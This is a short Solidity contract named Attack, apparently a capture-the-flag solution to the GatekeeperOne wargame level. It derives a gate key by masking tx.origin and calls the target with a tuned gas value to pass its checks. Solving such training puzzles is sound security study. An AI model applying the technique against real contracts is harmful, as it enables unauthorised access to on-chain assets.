pragma solidity ^0.6.0;

import "./default.sol";

contract Attack {
    bool public test = true;
    GatekeeperOne gate;

    constructor(address _gate) public {
        gate = GatekeeperOne(_gate);
    }

    function enter() public {
        bytes8 _gatekey = bytes8(uint64(tx.origin));
        bytes8 mask = 0xffffffff0000ffff;
        bytes8 gatekey = _gatekey & mask;
        gate.enter.gas(98546)(gatekey);
    }
}
